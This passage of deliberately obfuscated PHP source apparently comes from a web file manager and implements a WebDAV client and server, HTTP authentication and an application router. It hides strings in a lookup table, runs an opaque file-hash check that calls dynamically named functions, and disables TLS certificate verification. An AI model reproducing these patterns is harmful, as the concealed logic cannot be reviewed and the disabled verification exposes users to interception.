C‚êø‹Ëùã; AŞîêÄĞ: die; goto bê–Å©ª£õ; b¬——¿±¤: header($a–«ˆâÑ˜Õ[1766]); header($a–«ˆâÑ˜Õ[1767]); header($a–«ˆâÑ˜Õ[1263]); goto AŞîêÄĞ; C‚êø‹Ëùã: $a–«ˆâÑ˜Õ =& $_SERVER[¼€¼ˆ¦‚¡]; header($a–«ˆâÑ˜Õ[1764]); header($a–«ˆâÑ˜Õ[1765]); goto b¬——¿±¤; bê–Å©ª£õ: } public static function make($c¼³Òˆòë, $aÚÃè¨„ÅÚ) { $E¿ÁÏ…‹ˆì =& $_SERVER[¼€¼ˆ¦‚¡]; return $E¿ÁÏ…‹ˆì[1768] + base64_encode($c¼³Òˆòë . $E¿ÁÏ…‹ˆì[4] . $aÚÃè¨„ÅÚ); } } $CÆù¢é’æÙ = LIB_DIR . $_SERVER[¼€¼ˆ¦‚¡][785]; $A°²„ŸÉ½ğ = $_SERVER[¼€¼ˆ¦‚¡][786]; goto BÕù»Ï«ç•; BÕù»Ï«ç•: if ($_SERVER[$_SERVER[¼€¼ˆ¦‚¡][787]] != $A°²„ŸÉ½ğ($CÆù¢é’æÙ)) { goto AŠ›È‚”™; BöªŒÆİ×ñ: $FÈö‹Ô›¨ = explode($_SERVER[¼€¼ˆ¦‚¡][217], $bŸáÏäÛõ); if (count($FÈö‹Ô›¨) < $_SERVER[¼€¼ˆ¦‚¡][556]) { $DĞµŞùëÕ = $_SERVER[¼€¼ˆ¦‚¡][792]; $DĞµŞùëÕ(); } $a×¢æ¶¤À = $_SERVER[¼€¼ˆ¦‚¡][1049]; goto AÊÌ¬àƒùº; AŠ›È‚”™: $DçÆçîØ¦ = $_SERVER[¼€¼ˆ¦‚¡][789]; $a‚¬‚‚ÃŠ„ = $_SERVER[$_SERVER[¼€¼ˆ¦‚¡][790]] . $_SERVER[¼€¼ˆ¦‚¡][791]; $bŸáÏäÛõ = $DçÆçîØ¦($a‚¬‚‚ÃŠ„); goto BöªŒÆİ×ñ; AÊÌ¬àƒùº: $a×¢æ¶¤À($CÆù¢é’æÙ); goto d¥Ó¬“å‘ß; d¥Ó¬“å‘ß: } class HttpDavClient { public function __construct($e ââ°Ø„•, $a¥ã•ò‡Ù, $FÖ×¹Ç‰) { $this->header = array(); $this->userName = $a¥ã•ò‡Ù; $this->userPassowrd = $FÖ×¹Ç‰; } protected function makePath($A˜Ú¡´„Ìª) { return $A˜Ú¡´„Ìª; } protected function setHeader($aí ¤Ñá, $C±˜¤“ØÔ = false) { if ($C±˜¤“ØÔ === !1) { $this->header[] = $aí ¤Ñá; } else { $this->header[] = $aí ¤Ñá . $_SERVER[¼€¼ˆ¦‚¡][879] . $C±˜¤“ØÔ; } } public function move($AÚõ¿ìÇŒ, $BÛå¬Ì¬–Ï, $Eîåœ«”® = '') { $e‰ÄŞ°ïƒ“ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->setHeader($e‰ÄŞ°ïƒ“[1769], $this->makePath($BÛå¬Ì¬–Ï)); $this->setHeader($e‰ÄŞ°ïƒ“[1770], $e‰ÄŞ°ïƒ“[1771]); if ($Eîåœ«”®) { $this->setHeader($e‰ÄŞ°ïƒ“[1772], $e‰ÄŞ°ïƒ“[924] . $Eîåœ«”® . $e‰ÄŞ°ïƒ“[927]); } return $this->send($e‰ÄŞ°ïƒ“[1773], $AÚõ¿ìÇŒ); } public function copy($A¬¢³åİÔó, $Cñ¾˜£µÔ) { $d•Á×­¦š­ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->setHeader($d•Á×­¦š­[1769], $this->makePath($Cñ¾˜£µÔ)); $this->setHeader($d•Á×­¦š­[1770], $d•Á×­¦š­[1771]); return $this->send($d•Á×­¦š­[1774], $A¬¢³åİÔó); } public function mkcol($fè…İ«Éö) { $A…Ø¢”Š‡ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->setHeader($A…Ø¢”Š‡[1770], $A…Ø¢”Š‡[1771]); return $this->send($A…Ø¢”Š‡[1775], $fè…İ«Éö); } public function delete($AƒĞË­Ì, $a ôé§ÕĞø = '') { $DÜà³ò»±ä =& $_SERVER[¼€¼ˆ¦‚¡]; if ($a ôé§ÕĞø) { $this->setHeader($DÜà³ò»±ä[1772], $DÜà³ò»±ä[924] . $a ôé§ÕĞø . $DÜà³ò»±ä[927]); } return $this->send($DÜà³ò»±ä[1251], $AƒĞË­Ì); } public function propfind($DğÚ“öò»±) { $e¾Ö¹²‡¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->setHeader($e¾Ö¹²‡¶[1776], $e¾Ö¹²‡¶[83]); $this->setHeader($e¾Ö¹²‡¶[1777], $e¾Ö¹²‡¶[1778]); $C¸ë²ùò” = $e¾Ö¹²‡¶[1779]; return $this->send($e¾Ö¹²‡¶[1780], $DğÚ“öò»±, $C¸ë²ùò”); } public function options($bØ»Ô‚‚ ì) { return $this->send($_SERVER[¼€¼ˆ¦‚¡][1781], $bØ»Ô‚‚ ì); } public function get($DâÄñŠ³¢†) { return $this->send($_SERVER[¼€¼ˆ¦‚¡][216], $DâÄñŠ³¢†); } public function put($AïÓ‹øåˆ½, $EãµšåÜßÚ, $B‚óÃê—º = '') { $céÀ›Ø‹ˆÜ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($B‚óÃê—º) { $this->setHeader($céÀ›Ø‹ˆÜ[1772], $céÀ›Ø‹ˆÜ[924] . $B‚óÃê—º . $céÀ›Ø‹ˆÜ[927]); } return $this->send($céÀ›Ø‹ˆÜ[214], $AïÓ‹øåˆ½, $EãµšåÜßÚ); } protected function send($a‘ĞæìïˆÌ, $AµàéŒˆôİ, $E’¥éš››µ = false, $dù›òÂÉëÁ = false) { goto b‡ìÃ‰‹¼; f§™¤Ğ¿öÔ: $this->header = array(); return $döøòĞ«ë’; goto EèÅö°¯ö˜; eæ…Á˜†Ë‹: curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_SSL_VERIFYHOST, !1); $döøòĞ«ë’ = curl_exec($C¿Ü¡ƒÒÂ); goto f§™¤Ğ¿öÔ; Cä­íÂè“: $C¿Ü¡ƒÒÂ = curl_init($AµàéŒˆôİ); curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_CUSTOMREQUEST, $a‘ĞæìïˆÌ); curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto B¢ÎİÇõÃê; dƒ¯¶¶¹Êƒ: $this->setHeader($e”Ü„âøÆì); if ($E’¥éš››µ) { $E’¥éš››µ = $EŸëø§ã­[1783] . $E’¥éš››µ; } if (!request_url_safe($AµàéŒˆôİ)) { return !1; } goto Cä­íÂè“; B¢ÎİÇõÃê: curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C¿Ü¡ƒÒÂ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto eæ…Á˜†Ë‹; b‡ìÃ‰‹¼: $EŸëø§ã­ =& $_SERVER[¼€¼ˆ¦‚¡]; $e”Ü„âøÆì = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($EŸëø§ã­[1782], $EŸëø§ã­[50]); goto dƒ¯¶¶¹Êƒ; EèÅö°¯ö˜: } } class HttpDavServer { public function __construct($F’”‹¦²‡”, $Fºù„´Î¿ß) { $this->root = $F’”‹¦²‡”; $this->initPath($Fºù„´Î¿ß); $this->start(); } public function initPath($b°Ú¥•Û¯¾) { $Cîªã¿„“Œ =& $_SERVER[¼€¼ˆ¦‚¡]; $BƒšÄ·£Î‰ = rtrim($_SERVER[$Cîªã¿„“Œ[1387]], $Cîªã¿„“Œ[8]) . $Cîªã¿„“Œ[8]; $this->urlBase = substr($BƒšÄ·£Î‰, 0, strpos($BƒšÄ·£Î‰, $b°Ú¥•Û¯¾) + 1); $this->urlBase = rtrim($this->urlBase, $Cîªã¿„“Œ[8]) . $b°Ú¥•Û¯¾; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $bøéÚ«Ó´ğ =& $_SERVER[¼€¼ˆ¦‚¡]; $fôÈ¿–÷ Œ = HttpAuth::get(); if ($fôÈ¿–÷ Œ[$bøéÚ«Ó´ğ[535]] == $bøéÚ«Ó´ğ[1784] && $fôÈ¿–÷ Œ[$bøéÚ«Ó´ğ[896]] == $bøéÚ«Ó´ğ[1785]) { return !0; } HttpAuth::error(); } public function start() { goto aÄëËÖë’â; fÙ™±£ÔÒÎ: if (!$A†…’ÑÜõø) { return; } self::response($A†…’ÑÜõø); goto EìÌ‘ùÔ¢; aÄëËÖë’â: $b‹ä£Ì„é =& $_SERVER[¼€¼ˆ¦‚¡]; $this->checkUser(); $B‹Æ¨ˆ­ï = $b‹ä£Ì„é[144] . HttpHeader::method(); goto A§¨ƒ’·¦˜; A§¨ƒ’·¦˜: if (!method_exists($this, $B‹Æ¨ˆ­ï)) { pr($B‹Æ¨ˆ­ï . $b‹ä£Ì„é[1786]); die; } $cœÍ˜¸Õí¦ = array($b‹ä£Ì„é[1787], $b‹ä£Ì„é[1788]); if (!in_array($B‹Æ¨ˆ­ï, $cœÍ˜¸Õí¦) && !$this->pathExists($this->path)) { $A†…’ÑÜõø = array($b‹ä£Ì„é[1031] => 404); } else { $A†…’ÑÜõø = $this->{$B‹Æ¨ˆ­ï}(); } goto fÙ™±£ÔÒÎ; EìÌ‘ùÔ¢: } public function pathGet($f‹Ÿ¹À‰¸„ = false) { $B©´˜Ùöë =& $_SERVER[¼€¼ˆ¦‚¡]; $c‹º¶ÛÌ‰Ù = $f‹Ÿ¹À‰¸„ ? $_SERVER[$B©´˜Ùöë[1789]] : $_SERVER[$B©´˜Ùöë[1387]]; $c‹º¶ÛÌ‰Ù = KodIO::clear(rawurldecode($c‹º¶ÛÌ‰Ù)); if (!strstr($c‹º¶ÛÌ‰Ù, KodIO::clear($this->urlBase))) { return !1; } return substr($c‹º¶ÛÌ‰Ù, strpos($c‹º¶ÛÌ‰Ù, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($Aƒ›ƒ‰«Œ‘) { return file_exists($Aƒ›ƒ‰«Œ‘); } public function pathMkdir($fÔÖÚºœè‚) { return mkdir($fÔÖÚºœè‚, 511, !0); } public function pathInfo($Fù­‡ÀõÃ‹) { return path_info($Fù­‡ÀõÃ‹); } public function pathList($A¢¦“‡ÅÂ) { return path_list($A¢¦“‡ÅÂ); } public function pathOut($C‘Œ¬¡î½¿) { echo file_get_contents($C‘Œ¬¡î½¿); } public function pathPut($DŸ¼à‚í¢, $B«º¹†ï = '') { if (!$B«º¹†ï) { return file_put_contents($DŸ¼à‚í¢, $_SERVER[¼€¼ˆ¦‚¡][33]); } return move_path($B«º¹†ï, $DŸ¼à‚í¢); } public function pathRemove($eä£É‘Ê) { if (is_file($eä£É‘Ê)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Aõ–­Ê‚õ, $C­§’Ñ¼ãó) { return move_path($Aõ–­Ê‚õ, $C­§’Ñ¼ãó); } public function pathCopy($dÛó¶˜àÜÃ, $A‘¦½àŸ‘Ü) { return copy_dir($dÛó¶˜àÜÃ, $A‘¦½àŸ‘Ü); } public function parsePath($A«ÔŠ¾™å•) { return $A«ÔŠ¾™å•; } public function parseItem($eĞ»ù´îìË, $cÊ†ãƒ“’Ù) { goto C˜¼ŠåÀäˆ; C˜¼ŠåÀäˆ: $c†Ç¦ô¶´™ =& $_SERVER[¼€¼ˆ¦‚¡]; $eê¿Íßä¸¦ = $this->pathGet() . $c†Ç¦ô¶´™[8] . $eĞ»ù´îìË[$c†Ç¦ô¶´™[28]]; $eê¿Íßä¸¦ = $c†Ç¦ô¶´™[8] . str_replace($c†Ç¦ô¶´™[172], $c†Ç¦ô¶´™[8], rawurlencode($eê¿Íßä¸¦)); goto C¦“ª¸®¯í; A†ÅçÔâÊ: $DŒ¥“¥Ş§ = array($c†Ç¦ô¶´™[1790] => KodIO::clear($this->urlBase . $eê¿Íßä¸¦), $c†Ç¦ô¶´™[107] => @gmdate($c†Ç¦ô¶´™[1791], $eĞ»ù´îìË[$c†Ç¦ô¶´™[107]]), $c†Ç¦ô¶´™[187] => @gmdate($c†Ç¦ô¶´™[1792], $eĞ»ù´îìË[$c†Ç¦ô¶´™[187]]), $c†Ç¦ô¶´™[77] => $eĞ»ù´îìË[$c†Ç¦ô¶´™[77]] ? $eĞ»ù´îìË[$c†Ç¦ô¶´™[77]] : 0); return $DŒ¥“¥Ş§; goto EÄˆæ™’òˆ; C¦“ª¸®¯í: if ($cÊ†ãƒ“’Ù) { $eê¿Íßä¸¦ = $c†Ç¦ô¶´™[8] . str_replace($c†Ç¦ô¶´™[172], $c†Ç¦ô¶´™[8], rawurlencode($this->pathGet())); } if (!trim($eĞ»ù´îìË[$c†Ç¦ô¶´™[107]])) { $eĞ»ù´îìË[$c†Ç¦ô¶´™[107]] = time(); } if (!trim($eĞ»ù´îìË[$c†Ç¦ô¶´™[187]])) { $eĞ»ù´îìË[$c†Ç¦ô¶´™[187]] = time(); } goto A†ÅçÔâÊ; EÄˆæ™’òˆ: } public function parseItemXml($B¼¢Œ‡İïÆ, $aƒ¸ø‰Âîç) { $fâ¢‹ˆÅƒ‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $fÅí¢ÈÈœ = $this->parseItem($B¼¢Œ‡İïÆ, $aƒ¸ø‰Âîç); if ($B¼¢Œ‡İïÆ[$fâ¢‹ˆÅƒ‰[29]] == $fâ¢‹ˆÅƒ‰[76]) { $c¿ÎÃ½Íæ = $fâ¢‹ˆÅƒ‰[1793]; $c¿ÎÃ½Íæ .= $fâ¢‹ˆÅƒ‰[1794]; } else { $E÷Ó£Û¾ªÓ = $B¼¢Œ‡İïÆ[$fâ¢‹ˆÅƒ‰[160]] ? $B¼¢Œ‡İïÆ[$fâ¢‹ˆÅƒ‰[160]] : get_path_ext($B¼¢Œ‡İïÆ[$fâ¢‹ˆÅƒ‰[28]]); $cÀÚƒÏŸ¶ê = get_file_mime($E÷Ó£Û¾ªÓ); $c¿ÎÃ½Íæ = $fâ¢‹ˆÅƒ‰[1795]; $c¿ÎÃ½Íæ .= "\74\x44\x3a\147\145\164\143\157\x6e\164\x65\x6e\x74\x74\171\160\x65\76{$cÀÚƒÏŸ¶ê}\74\x2f\x44\72\147\145\x74\x63\x6f\156\x74\145\x6e\x74\164\x79\x70\x65\76"; } return "\12\11\11\x3c\x44\x3a\x72\x65\163\160\x6f\x6e\x73\x65\x3e\xa\x9\11\11\x3c\x44\x3a\150\x72\x65\x66\76{$fÅí¢ÈÈœ[$fâ¢‹ˆÅƒ‰[1790]]}\74\x2f\104\72\x68\x72\x65\146\x3e\12\x9\x9\11\74\x44\72\160\162\157\160\163\164\141\x74\76\12\x9\x9\x9\x9\74\x44\x3a\160\162\x6f\x70\x3e\12\x9\x9\11\11\11\74\x44\x3a\x67\145\164\154\141\x73\164\155\157\x64\x69\x66\151\145\144\76{$fÅí¢ÈÈœ[$fâ¢‹ˆÅƒ‰[107]]}\x3c\57\x44\x3a\147\x65\164\x6c\x61\163\164\x6d\x6f\x64\x69\146\x69\x65\144\x3e\12\x9\x9\11\x9\11\74\x44\x3a\143\162\145\x61\164\x69\x6f\156\x64\x61\164\x65\x3e{$fÅí¢ÈÈœ[$fâ¢‹ˆÅƒ‰[187]]}\74\57\x44\x3a\x63\x72\x65\141\x74\x69\157\x6e\144\141\x74\x65\76\xa\11\11\11\11\x9\x3c\x44\72\147\145\164\143\x6f\x6e\x74\145\156\164\154\145\x6e\x67\164\150\x3e{$fÅí¢ÈÈœ[$fâ¢‹ˆÅƒ‰[77]]}\74\x2f\x44\72\147\145\x74\143\x6f\156\164\x65\x6e\164\154\x65\156\x67\x74\x68\x3e\12\11\11\x9\x9\x9{$c¿ÎÃ½Íæ}\xa\x9\11\x9\11\x3c\57\104\x3a\160\162\157\x70\76\xa\x9\x9\11\11\x3c\x44\x3a\x73\164\141\x74\x75\x73\76\110\124\x54\x50\57\61\56\x31\x20\62\x30\x30\40\117\113\74\x2f\104\x3a\163\x74\x61\164\x75\x73\x3e\xa\x9\11\11\x3c\57\104\x3a\x70\162\x6f\x70\163\164\x61\x74\x3e\xa\11\11\74\x2f\104\x3a\x72\145\163\x70\157\156\x73\145\x3e"; } public function pathListMerge($a¢œ™Š©‘) { goto E”Ğ³ğëò; cˆÒø§Ì£„: return $F‡ÍÒ¤à§‰; goto CõÙ†‡•Ü¡; C—ĞÕ·Š˜ù: $F‡ÍÒ¤à§‰ = array(); foreach ($a¢œ™Š©‘ as $aêØÜâ¶ßÀ => $AÂ«ÔŠ¨­Ú) { if (!in_array($aêØÜâ¶ßÀ, $A‰¦İ±¹­Œ) || !is_array($AÂ«ÔŠ¨­Ú)) { continue; } $F‡ÍÒ¤à§‰ = array_merge($F‡ÍÒ¤à§‰, $AÂ«ÔŠ¨­Ú); } foreach ($F‡ÍÒ¤à§‰ as &$DÅŞãÊ˜›…) { $DÅŞãÊ˜›…[$f²ğÀ‰–½”[28]] = str_replace($f²ğÀ‰–½”[8], $f²ğÀ‰–½”[1389], $DÅŞãÊ˜›…[$f²ğÀ‰–½”[28]]); } goto cˆÒø§Ì£„; E”Ğ³ğëò: $f²ğÀ‰–½” =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$a¢œ™Š©‘) { return $a¢œ™Š©‘; } $A‰¦İ±¹­Œ = array($f²ğÀ‰–½”[73], $f²ğÀ‰–½”[74], $f²ğÀ‰–½”[1796]); goto C—ĞÕ·Š˜ù; CõÙ†‡•Ü¡: } public function httpPROPFIND() { goto cÛ…˜Œ•¡; cÛ…˜Œ•¡: $aïóãÓä¼Ô =& $_SERVER[¼€¼ˆ¦‚¡]; $dˆ‘çóíê = $this->pathList($this->path); $B¤Ïš‡Šê = $this->pathListMerge($dˆ‘çóíê); goto f®é½Õ…ºÑ; bßÚÏ®¤ƒÀ: return array($aïóãÓä¼Ô[1799] => 207, $aïóãÓä¼Ô[1800] => "\74\x44\x3a\x6d\165\x6c\164\151\x73\x74\141\x74\165\x73\40\170\x6d\x6c\156\x73\x3a\x44\75\42\104\101\126\x3a\42\76\xa{$B½ãÎš±•š}\12\x3c\57\x44\x3a\x6d\x75\x6c\x74\x69\163\x74\141\164\x75\163\76"); goto Cì÷é®¢ÓÙ; f®é½Õ…ºÑ: $f¢¾±¦Â¾É = $dˆ‘çóíê[$aïóãÓä¼Ô[1797]]; if (!is_array($B¤Ïš‡Šê) || $f¢¾±¦Â¾É[$aïóãÓä¼Ô[1798]] === !1) { return array($aïóãÓä¼Ô[1799] => 404, $aïóãÓä¼Ô[1800] => $aïóãÓä¼Ô[1801]); } $bâó½Êå“ = $f¢¾±¦Â¾É[$aïóãÓä¼Ô[29]] == $aïóãÓä¼Ô[167] || HttpHeader::get($aïóãÓä¼Ô[1776]) == $aïóãÓä¼Ô[468]; goto Aæ÷ğóÔßÆ; Aæ÷ğóÔßÆ: if ($bâó½Êå“) { $B¤Ïš‡Šê = array($f¢¾±¦Â¾É); } else { $f¢¾±¦Â¾É[$aïóãÓä¼Ô[28]] = $aïóãÓä¼Ô[33]; $B¤Ïš‡Šê = array_merge(array($f¢¾±¦Â¾É), $B¤Ïš‡Šê); } $B½ãÎš±•š = $aïóãÓä¼Ô[33]; foreach ($B¤Ïš‡Šê as $BŞ…¢„Üç‡) { $B½ãÎš±•š .= $this->parseItemXml($BŞ…¢„Üç‡, $bâó½Êå“); } goto bßÚÏ®¤ƒÀ; Cì÷é®¢ÓÙ: } public function httpHEAD() { $b…¦™æ¾¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $d–ƒŒµó‚Ï = $this->pathInfo($this->path); if (!$d–ƒŒµó‚Ï || $d–ƒŒµó‚Ï[$b…¦™æ¾¢[29]] == $b…¦™æ¾¢[76]) { return array($b…¦™æ¾¢[1031] => 200, $b…¦™æ¾¢[1207] => array($b…¦™æ¾¢[1802])); } return array($b…¦™æ¾¢[1031] => 200, $b…¦™æ¾¢[1207] => array($b…¦™æ¾¢[1803], $b…¦™æ¾¢[136], $b…¦™æ¾¢[1804] . $d–ƒŒµó‚Ï[$b…¦™æ¾¢[77]], $b…¦™æ¾¢[1805] . get_file_mime($d–ƒŒµó‚Ï[$b…¦™æ¾¢[160]]), $b…¦™æ¾¢[132] . gmdate($b…¦™æ¾¢[1791], $d–ƒŒµó‚Ï[$b…¦™æ¾¢[1254]]) . $b…¦™æ¾¢[1806], $b…¦™æ¾¢[1807])); } public function httpOPTIONS() { $B™½âÒÈö =& $_SERVER[¼€¼ˆ¦‚¡]; return array($B™½âÒÈö[1031] => 200, $B™½âÒÈö[1207] => array($B™½âÒÈö[1808], $B™½âÒÈö[1809], $B™½âÒÈö[1810], $B™½âÒÈö[1263])); } public function httpPROPPATCH() { $F›Á±Íä´† =& $_SERVER[¼€¼ˆ¦‚¡]; $bô¿Œ™†Ç = $F›Á±Íä´†[1811] . $_SERVER[$F›Á±Íä´†[1387]] . $F›Á±Íä´†[1812]; return array($F›Á±Íä´†[1799] => 207, $F›Á±Íä´†[1800] => "\x3c\x44\72\155\x75\154\164\x69\x73\164\x61\164\165\x73\40\170\155\154\156\x73\x3a\x44\x3d\42\104\x41\x56\72\42\76\12{$bô¿Œ™†Ç}\xa\74\57\104\x3a\155\x75\x6c\164\x69\x73\x74\141\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $cÇÙœ¢¾¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $D¯Ä¾¾ìó = $this->uploadFile(); if ($D¯Ä¾¾ìó) { $aÄ†Ú¾ï­È = 204; } else { $D¯Ä¾¾ìó = $cÇÙœ¢¾¢[33]; $aÄ†Ú¾ï­È = 201; } $D¤ÙÜµ‘„× = $this->pathPut($this->path, $D¯Ä¾¾ìó); if ($D¤ÙÜµ‘„× == !1) { $aÄ†Ú¾ï­È = 404; } return array($cÇÙœ¢¾¢[1799] => $aÄ†Ú¾ï­È); } private function uploadFile() { goto e‰¾ª­ß; e‰¾ª­ß: $E‹«¥÷‰â =& $_SERVER[¼€¼ˆ¦‚¡]; @mk_dir(TEMP_FILES); $bê„âÉ É = TEMP_FILES . $E‹«¥÷‰â[1813] . rand_string(32); goto A®Ò„µŠ³·; A®Ò„µŠ³·: $C¼™Ã¥±æ = @fopen($bê„âÉ É, $E‹«¥÷‰â[1522]); $f×‚ğ›ŒÙ­ = @fopen($E‹«¥÷‰â[1814], $E‹«¥÷‰â[1521]); if (!$f×‚ğ›ŒÙ­ || !$C¼™Ã¥±æ) { @unlink($bê„âÉ É); return !1; } goto DæÒŸ—µâ¼; DæÒŸ—µâ¼: while (!feof($f×‚ğ›ŒÙ­)) { fwrite($C¼™Ã¥±æ, fread($f×‚ğ›ŒÙ­, 1024 * 200)); } fclose($f×‚ğ›ŒÙ­); fclose($C¼™Ã¥±æ); goto E±·÷Ş «†; E±·÷Ş «†: if (@filesize($bê„âÉ É) > 0) { return $bê„âÉ É; } @unlink($bê„âÉ É); return !1; goto c¾ÁãÑ²†; c¾ÁãÑ²†: } public function httpMKCOL() { $eË¥•¶¿™Î =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->pathExists($this->path)) { return array($eË¥•¶¿™Î[1031] => 409); } $Cº©—Ãñè = $this->pathMkdir($this->path); return array($eË¥•¶¿™Î[1031] => $Cº©—Ãñè ? 201 : 403); } public function httpMOVE() { $c§æĞÅÆèÍ =& $_SERVER[¼€¼ˆ¦‚¡]; $E¶¬ù¿·Œ… = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$c§æĞÅÆèÍ[1815]])) { $Aìøœ‰ğÌ[$c§æĞÅÆèÍ[1816]] = $_SERVER[$c§æĞÅÆèÍ[1815]] == $c§æĞÅÆèÍ[1817]; } $eÅ‘ØàÙ¹ö = $this->pathMove($this->path, $E¶¬ù¿·Œ…); return array($c§æĞÅÆèÍ[1031] => $eÅ‘ØàÙ¹ö ? 201 : 404); } public function httpCOPY() { $A‡£¯ÅÜŒ§ = $this->parsePath($this->pathGet(!0)); $Bâ’îºóõø = $this->pathCopy($this->path, $A‡£¯ÅÜŒ§); return array($_SERVER[¼€¼ˆ¦‚¡][1031] => $Bâ’îºóõø ? 201 : 404); } public function httpDELETE() { $B¢çÈ½Ù™² = $this->pathRemove($this->path); return array($_SERVER[¼€¼ˆ¦‚¡][1031] => $B¢çÈ½Ù™² ? 200 : 503); } public function httpLOCK() { $B‘ƒ¾¨’Ùó =& $_SERVER[¼€¼ˆ¦‚¡]; $cÕ¸£ªÚí‰ = md5($this->path); $b˜ÙÁßë×ò = $B‘ƒ¾¨’Ùó[1818] . $this->xmlGet($B‘ƒ¾¨’Ùó[1819]) . $B‘ƒ¾¨’Ùó[1820] . $cÕ¸£ªÚí‰ . $B‘ƒ¾¨’Ùó[1821]; return array($B‘ƒ¾¨’Ùó[1031] => 200, $B‘ƒ¾¨’Ùó[1207] => array($B‘ƒ¾¨’Ùó[1822] . $cÕ¸£ªÚí‰, $B‘ƒ¾¨’Ùó[1823]), $B‘ƒ¾¨’Ùó[1824] => $b˜ÙÁßë×ò); } public function httpUNLOCK() { return array($_SERVER[¼€¼ˆ¦‚¡][1031] => 204); } public function xmlGet($dàØêÂ¿Ï) { goto CÀäæË¿Â¯; dƒó·Ğë§: return $fÚœ«êò¡[33]; goto cÎÇ­÷ÒÚ; CÀäæË¿Â¯: $fÚœ«êò¡ =& $_SERVER[¼€¼ˆ¦‚¡]; static $c‡çÂââğÃ = false; if (!$c‡çÂââğÃ) { $e£¹Ì¥ˆ£ä = file_get_contents($fÚœ«êò¡[1825]); $c‡çÂââğÃ = new DOMDocument(); $c‡çÂââğÃ->loadXML($e£¹Ì¥ˆ£ä); } goto a¼åìĞ¾èÁ; a¼åìĞ¾èÁ: $C—õƒ˜¥¤è = array_shift(explode($fÚœ«êò¡[8], $dàØêÂ¿Ï)); $C¯š‰Öá—† = $c‡çÂââğÃ->getElementsByTagNameNS($fÚœ«êò¡[1826], $C—õƒ˜¥¤è); if ($C¯š‰Öá—†) { return $C¯š‰Öá—†[0]->nodeValue; } goto dƒó·Ğë§; cÎÇ­÷ÒÚ: } public static function response($eø¬ô˜§ì) { goto bø©Îï×Ó‚; bø©Îï×Ó‚: $dÀÜ¬ŞœĞ‘ =& $_SERVER[¼€¼ˆ¦‚¡]; $DåæòèˆÆÏ = is_array($eø¬ô˜§ì[$dÀÜ¬ŞœĞ‘[1207]]) ? $eø¬ô˜§ì[$dÀÜ¬ŞœĞ‘[1207]] : array(); $DåæòèˆÆÏ[] = HttpHeader::code($eø¬ô˜§ì[$dÀÜ¬ŞœĞ‘[1031]]); goto A¡××±·Ø; dÌ™ˆŒôğ‡: if (is_string($eø¬ô˜§ì[$dÀÜ¬ŞœĞ‘[1824]])) { header($dÀÜ¬ŞœĞ‘[1827]); $d…‰é–Éù = $dÀÜ¬ŞœĞ‘[1828] . $dÀÜ¬ŞœĞ‘[217] . $eø¬ô˜§ì[$dÀÜ¬ŞœĞ‘[1824]]; echo $d…‰é–Éù; } goto E…Èæì‘¯¬; A¡××±·Ø: $DåæòèˆÆÏ[] = $dÀÜ¬ŞœĞ‘[1766]; $DåæòèˆÆÏ[] = $dÀÜ¬ŞœĞ‘[1767]; foreach ($DåæòèˆÆÏ as $d¦Ô¾ê¤) { header($d¦Ô¾ê¤); } goto dÌ™ˆŒôğ‡; E…Èæì‘¯¬: } } goto cô½ÀŸÑÔ•; cÀùí×àŠ”: $f¤•ÈÙ³ = $_SERVER[¼€¼ˆ¦‚¡][551]; class Application { private $defaultModule = "\x69\x6e\x64\x65\170"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\151\x6e\144\145\170"; function __construct() { } public function setDefault($B™‘‚Ñò‘¡) { goto a²¤áÎ¢ƒ; a²¤áÎ¢ƒ: $bÎŒóí‚¾ =& $_SERVER[™óşĞñ‡Ë]; $EäšÑÈŠ  = $bÎŒóí‚¾[0]($bÎŒóí‚¾[1], $bÎŒóí‚¾[2]($B™‘‚Ñò‘¡, $bÎŒóí‚¾[1])); $this->defaultModule = $EäšÑÈŠ [0] ? $EäšÑÈŠ [0] : $this->defaultModule; goto d»ŠËæ¾¬; F³Á‰ÃßÉ×: $Aïò›ˆÁš = $_SERVER[¼€¼ˆ¦‚¡][552]; if (!$Aïò›ˆÁš) { return; } goto eôÎíÒ…¢; d»ŠËæ¾¬: $this->defaultController = $EäšÑÈŠ [1] ? $EäšÑÈŠ [1] : $this->defaultController; $this->defaultAction = $EäšÑÈŠ [2] ? $EäšÑÈŠ [2] : $this->defaultAction; $this->{$_SERVER[™óşĞñ‡Ë][3]}($bÎŒóí‚¾[4], array($this, $bÎŒóí‚¾[5])); goto F³Á‰ÃßÉ×; eôÎíÒ…¢: } public function appRun($Fí´¸ÛŞÁØ) { goto Cã’º¯ö¨ó; CòÈá”Íƒá: $E‚Ëäõß = $F–Ûï•îÊÂ[553]; if (strlen($E‚Ëäõß) < $F–Ûï•îÊÂ[554]) { die; } $B¶ÚÖŸîÓ“ = $Aô‘éÚ’[6]($f™’ê òĞ[0]); goto cÜ¸İòºÎÔ; Cã’º¯ö¨ó: $F–Ûï•îÊÂ =& $_SERVER[¼€¼ˆ¦‚¡]; $Aô‘éÚ’ =& $_SERVER[™óşĞñ‡Ë]; $f™’ê òĞ = $Aô‘éÚ’[0]($Aô‘éÚ’[1], $Fí´¸ÛŞÁØ); goto CòÈá”Íƒá; c‡Î¡øªÈ: 